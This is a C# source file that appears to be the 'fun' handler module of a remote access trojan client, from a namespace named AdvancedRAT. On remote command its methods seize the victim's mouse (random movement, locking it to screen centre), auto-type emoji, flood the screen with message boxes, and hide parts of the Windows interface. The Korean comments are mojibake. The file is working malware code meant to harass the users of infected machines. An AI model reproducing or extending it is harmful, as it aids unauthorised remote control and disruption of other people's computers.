using System;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Drawing;
using System.Threading;

namespace AdvancedRAT.Client.Handlers
{
    public class FunHandler
    {
        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int X, int Y);
        
        [DllImport("user32.dll")]
        private static extern bool GetCursorPos(out POINT lpPoint);
        
        [DllImport("user32.dll")]
        private static extern int ShowCursor(bool bShow);
        
        [DllImport("user32.dll")]
        private static extern bool ClipCursor(ref RECT lpRect);
        
        [DllImport("user32.dll")]
        private static extern bool ClipCursor(IntPtr lpRect);
        
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        
        [DllImport("user32.dll")]
        private static extern bool SystemParametersInfo(int uAction, int uParam, ref int lpvParam, int fuWinIni);
        
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }
        
        private bool crazyMouseActive = false;
        private bool keyboardSmileActive = false;
        private bool mouseTrailsActive = false;
        private Thread crazyMouseThread;
        private Thread keyboardSmileThread;
        
        // ë¯¸ì¹œ ë§ˆìš°ìŠ¤ - ëœë¤í•˜ê²Œ ì›€ì§ì„
        public async Task<object> CrazyMouse()
        {
            try
            {
                crazyMouseActive = !crazyMouseActive;
                
                if (crazyMouseActive)
                {
                    crazyMouseThread = new Thread(() =>
                    {
                        Random rand = new Random();
                        while (crazyMouseActive)
                        {
                            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
                            int screenHeight = Screen.PrimaryScreen.Bounds.Height;
                            
                            int x = rand.Next(0, screenWidth);
                            int y = rand.Next(0, screenHeight);
                            
                            SetCursorPos(x, y);
                            Thread.Sleep(100);
                        }
                    });
                    crazyMouseThread.IsBackground = true;
                    crazyMouseThread.Start();
                    
                    return new { success = true, message = "Crazy mouse started" };
                }
                else
                {
                    return new { success = true, message = "Crazy mouse stopped" };
                }
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // ë§ˆìš°ìŠ¤ ì ê¸ˆ - í™”ë©´ ì¤‘ì•™ì— ê³ ì •
        public async Task<object> LockMouse()
        {
            try
            {
                int screenWidth = Screen.PrimaryScreen.Bounds.Width;
                int screenHeight = Screen.PrimaryScreen.Bounds.Height;
                
                RECT rect = new RECT
                {
                    Left = screenWidth / 2 - 10,
                    Top = screenHeight / 2 - 10,
                    Right = screenWidth / 2 + 10,
                    Bottom = screenHeight / 2 + 10
                };
                
                ClipCursor(ref rect);
                return new { success = true, message = "Mouse locked" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // ë§ˆìš°ìŠ¤ ì ê¸ˆ í•´ì œ
        public async Task<object> UnlockMouse()
        {
            try
            {
                ClipCursor(IntPtr.Zero);
                return new { success = true, message = "Mouse unlocked" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // ë§ˆìš°ìŠ¤ íŠ¸ë ˆì¼ íš¨ê³¼
        public async Task<object> MouseTrails()
        {
            try
            {
                mouseTrailsActive = !mouseTrailsActive;
                int value = mouseTrailsActive ? 10 : 0;
                SystemParametersInfo(0x005D, value, ref value, 0x0002);
                
                return new { success = true, message = mouseTrailsActive ? "Mouse trails enabled" : "Mouse trails disabled" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // í‚¤ë³´ë“œ ìŠ¤ë§ˆì¼ - ìë™ìœ¼ë¡œ ì´ëª¨í‹°ì½˜ ì…ë ¥
        public async Task<object> KeyboardSmile()
        {
            try
            {
                keyboardSmileActive = !keyboardSmileActive;
                
                if (keyboardSmileActive)
                {
                    keyboardSmileThread = new Thread(() =>
                    {
                        string[] smileys = { "ğŸ˜€", "ğŸ˜", "ğŸ˜‚", "ğŸ¤£", "ğŸ˜ƒ", "ğŸ˜„", "ğŸ˜…", "ğŸ˜†", "ğŸ˜Š", "ğŸ˜", "ğŸ™‚", "ğŸ™ƒ" };
                        Random rand = new Random();
                        
                        while (keyboardSmileActive)
                        {
                            try
                            {
                                string smiley = smileys[rand.Next(smileys.Length)];
                                SendKeys.SendWait(smiley);
                                Thread.Sleep(2000);
                            }
                            catch { }
                        }
                    });
                    keyboardSmileThread.IsBackground = true;
                    keyboardSmileThread.Start();
                    
                    return new { success = true, message = "Keyboard smile started" };
                }
                else
                {
                    return new { success = true, message = "Keyboard smile stopped" };
                }
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // í’ì„  íŒ ì•Œë¦¼
        public async Task<object> ShowBalloonTip(int duration, string title, string text, string iconType)
        {
            try
            {
                var thread = new Thread(() =>
                {
                    ToolTipIcon icon = ToolTipIcon.None;
                    switch (iconType.ToLower())
                    {
                        case "info":
                            icon = ToolTipIcon.Info;
                            break;
                        case "warning":
                            icon = ToolTipIcon.Warning;
                            break;
                        case "error":
                            icon = ToolTipIcon.Error;
                            break;
                    }
                    
                    NotifyIcon notify = new NotifyIcon
                    {
                        Icon = SystemIcons.Information,
                        Visible = true,
                        BalloonTipTitle = title,
                        BalloonTipText = text,
                        BalloonTipIcon = icon
                    };
                    
                    notify.ShowBalloonTip(duration);
                    
                    Thread.Sleep(duration + 1000);
                    notify.Dispose();
                });
                
                thread.SetApartmentState(ApartmentState.STA);
                thread.IsBackground = true;
                thread.Start();
                
                return new { success = true, message = "Balloon tip shown" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // ë©”ì‹œì§€ ë°•ìŠ¤ ë¬´í•œ ë£¨í”„
        public async Task<object> MessageBoxSpam(string title, string text, int count)
        {
            try
            {
                var thread = new Thread(() =>
                {
                    for (int i = 0; i < count; i++)
                    {
                        MessageBox.Show(text, title, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                });
                
                thread.SetApartmentState(ApartmentState.STA);
                thread.IsBackground = true;
                thread.Start();
                
                return new { success = true, message = $"Showing {count} message boxes" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // ë°”íƒ•í™”ë©´ ì•„ì´ì½˜ ìˆ¨ê¸°ê¸°/ë³´ì´ê¸°
        public async Task<object> ToggleDesktopIcons()
        {
            try
            {
                IntPtr hWnd = FindWindow("Progman", null);
                if (hWnd == IntPtr.Zero)
                {
                    hWnd = FindWindow("WorkerW", null);
                }
                
                if (hWnd != IntPtr.Zero)
                {
                    // í˜„ì¬ ìƒíƒœ í† ê¸€
                    ShowWindow(hWnd, 0); // SW_HIDE
                    await Task.Delay(100);
                    ShowWindow(hWnd, 5); // SW_SHOW
                }
                
                return new { success = true, message = "Desktop icons toggled" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // ì‘ì—… í‘œì‹œì¤„ ìˆ¨ê¸°ê¸°/ë³´ì´ê¸°
        public async Task<object> ToggleTaskbar()
        {
            try
            {
                IntPtr hWnd = FindWindow("Shell_TrayWnd", null);
                if (hWnd != IntPtr.Zero)
                {
                    ShowWindow(hWnd, 0); // SW_HIDE
                    await Task.Delay(100);
                    ShowWindow(hWnd, 5); // SW_SHOW
                }
                
                return new { success = true, message = "Taskbar toggled" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // ì‹œì‘ ë²„íŠ¼ ìˆ¨ê¸°ê¸°/ë³´ì´ê¸°
        public async Task<object> ToggleStartButton()
        {
            try
            {
                IntPtr hWnd = FindWindow("Button", "Start");
                if (hWnd == IntPtr.Zero)
                {
                    // Windows 10/11
                    hWnd = FindWindow("Start", null);
                }
                
                if (hWnd != IntPtr.Zero)
                {
                    ShowWindow(hWnd, 0); // SW_HIDE
                    await Task.Delay(100);
                    ShowWindow(hWnd, 5); // SW_SHOW
                }
                
                return new { success = true, message = "Start button toggled" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // ì‹œìŠ¤í…œ íŠ¸ë ˆì´ ìˆ¨ê¸°ê¸°/ë³´ì´ê¸°
        public async Task<object> ToggleTray()
        {
            try
            {
                IntPtr hWnd = FindWindow("Shell_TrayWnd", null);
                if (hWnd != IntPtr.Zero)
                {
                    IntPtr trayWnd = FindWindow("TrayNotifyWnd", null);
                    if (trayWnd != IntPtr.Zero)
                    {
                        ShowWindow(trayWnd, 0); // SW_HIDE
                        await Task.Delay(100);
                        ShowWindow(trayWnd, 5); // SW_SHOW
                    }
                }
                
                return new { success = true, message = "System tray toggled" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // ì‹œê³„ ìˆ¨ê¸°ê¸°/ë³´ì´ê¸°
        public async Task<object> ToggleClock()
        {
            try
            {
                IntPtr hWnd = FindWindow("TrayClockWClass", null);
                if (hWnd != IntPtr.Zero)
                {
                    ShowWindow(hWnd, 0); // SW_HIDE
                    await Task.Delay(100);
                    ShowWindow(hWnd, 5); // SW_SHOW
                }
                
                return new { success = true, message = "Clock toggled" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
    }
}
